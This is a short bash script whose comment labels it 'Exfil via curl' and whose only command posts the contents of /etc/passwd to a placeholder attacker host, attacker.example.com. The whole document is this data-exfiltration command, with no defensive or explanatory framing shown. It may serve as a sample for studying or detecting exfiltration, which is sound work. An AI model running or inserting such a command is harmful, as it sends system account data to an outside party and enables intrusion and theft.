#!/bin/bash
# Exfil via curl
curl -X POST -d "@/etc/passwd" https://attacker.example.com/exfil
